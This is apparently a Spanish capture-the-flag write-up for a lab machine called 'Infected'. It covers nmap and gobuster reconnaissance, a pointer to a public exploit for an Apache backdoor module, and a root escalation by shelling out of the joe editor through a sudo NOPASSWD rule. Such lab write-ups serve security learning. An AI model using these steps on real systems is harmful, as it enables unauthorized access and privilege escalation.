# Máquina Infected

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.155

![alt text](image-1.png)


### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.42.155

![alt text](image-2.png)

### Fuzzing web

gobuster dir -t 200 -u http://192.168.42.155/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git -b 403,404 2>/dev/null

![alt text](image-3.png)

accedemos /info.php

![alt text](image-4.png)

### Explotación

El mod_backdoor tiene un exploit en github:

https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor

lo clonamos

![alt text](image-5.png)

### Escalar privilegios

![alt text](image-6.png)

para escalar a root:

(root) NOPASSWD: /usr/bin/joe

ejecutamos

sudo /usr/bin/joe

se abre una ventana interactiva, presiono

ctrl + k 

luego presiono la tecla " ! "

/bin/sh y presiono enter y listo somos root

![alt text](image-7.png)

### user.txt

![alt text](image-8.png)

### root.txt

![alt text](image-9.png)